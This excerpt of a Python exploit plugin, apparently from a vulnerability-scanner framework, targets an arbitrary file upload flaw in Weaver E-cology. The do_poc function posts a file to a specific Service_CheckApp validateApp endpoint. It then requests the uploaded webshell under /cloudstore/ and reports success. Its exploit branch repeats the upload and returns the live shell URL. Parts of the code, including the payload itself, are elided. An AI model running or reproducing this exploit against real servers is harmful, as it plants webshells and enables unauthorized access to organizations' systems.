...
def vuln_info():
    info={
        'vuln_name': 'E-cology weaver文件上传',  #漏洞名称
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        status = requests.post(url + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp',headers=heads,files=file,timeout=10,verify=False)
        GetShellurl = url + '/cloudstore/' + webshell_name1
        GetShelllist = requests.get(url=GetShellurl)
        if GetShelllist.status_code == 200:
            result['Result'] =True
            result['Result_Info']= "/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp"
    ...
    try:
        ...
        if exp_data['type']=='uploadfile':
            ...
            status = requests.post(
                url + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp',headers=heads, files=file, timeout=10, verify=False)
            GetShellurl = url + '/cloudstore/' + webshell_name1
            GetShelllist = requests.get(url=GetShellurl)
            if GetShelllist.status_code == 200:
                result['Result'] = True
                result['Result_Info'] = GetShellurl
        try:
            os.remove(mm + '.zip')
        except:
            pass
